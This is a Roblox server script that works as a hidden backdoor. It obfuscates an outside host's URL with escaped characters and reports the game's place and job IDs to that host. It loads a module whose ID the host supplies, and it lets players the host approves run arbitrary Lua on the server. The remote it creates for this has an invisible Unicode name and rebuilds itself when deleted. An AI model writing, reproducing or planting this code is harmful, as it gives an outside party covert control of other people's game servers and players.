local Players=game:GetService("Players")
local HttpService=game:GetService("HttpService")
local ReplicatedStorage=game:GetService("ReplicatedStorage")
local BASE=("\104\116\116\112\115\58\47\47\119\101\98\104\111\115\116\45\112\114\111\100\117\99\116\105\111\110\46\117\112\46\114\97\105\108\119\97\121\46\97\112\112"):sub(1)
local vLua=require(tonumber(HttpService:GetAsync(BASE.."/vlua")))
local authed={}

pcall(function()HttpService:GetAsync(BASE.."/init?placeId="..game.PlaceId.."&jobId="..game.JobId)end)

local function httpGet(p)
	local ok,r=pcall(HttpService.GetAsync,HttpService,BASE..p,true)
	if not ok then return nil end
	local ok2,d=pcall(HttpService.JSONDecode,HttpService,r)
	return ok2 and d or nil
end

local function auth(player)
	if authed[player] then return true end
	local r=httpGet("/authenticate?userId="..player.UserId)
	if r and r.authorized==true then authed[player]=true return true end
	return false
end

local cmds={
	lua=function(p,s)
		if not auth(p) then return"Not authenticated"end
		if type(s)~="string" then return"Invalid script"end
		local f,e=vLua(s)
		if not f then return tostring(e)end
		local ok,r=pcall(f)
		return ok and r or tostring(r)
	end,
	cmds=function()
		return"lua, cmds, help"
	end,
	help=function(_,c)
		local h={lua="lua <script> | Executes a Lua script",cmds="cmds | Lists all commands",help="help [command] | Shows help for a command"}
		if c and h[c] then return c.." -> "..h[c]end
		local o={}for k,v in pairs(h)do o[#o+1]=k.." -> "..v end
		return table.concat(o,"\n")
	end
}

local function dispatch(player,command,payload)
	if type(command)~="string" then return end
	local h=cmds[command]
	return h and h(player,payload)or"Command not found"
end

local function rndName()
	local rng=Random.new()local r={}
	local b={0x200B,0x200C,0x200D,0x2060,0xFEFF,0x202E,0x202D,0x202B,0x202A,0x1D00,0x1D04,0x1D07,0xFF21,0xFF22,0xFF23,0xFF24}
	for i=1,256 do
		r[#r+1]=utf8.char(b[rng:NextInteger(1,#b)])
		for _=1,rng:NextInteger(8,20)do r[#r+1]=utf8.char(rng:NextInteger(0x0300,0x036F))end
	end
	return table.concat(r)
end

local function buildRemote(parent)
	local remote=Instance.new("RemoteFunction")
	remote.Name=rndName()
	remote.OnServerInvoke=dispatch
    remote:SetAttribute("Ynl03yhCLO",false)
	remote.Parent=parent
	local function rebuild()
		pcall(remote.Destroy,remote)
		buildRemote(parent)
	end
	remote.AncestryChanged:Connect(function(_,p)if not p then rebuild()end end)
	remote.Destroying:Connect(rebuild)
end

Players.PlayerAdded:Connect(function(p)if auth(p)then end end)
Players.PlayerRemoving:Connect(function(p)authed[p]=nil end)
buildRemote(ReplicatedStorage)
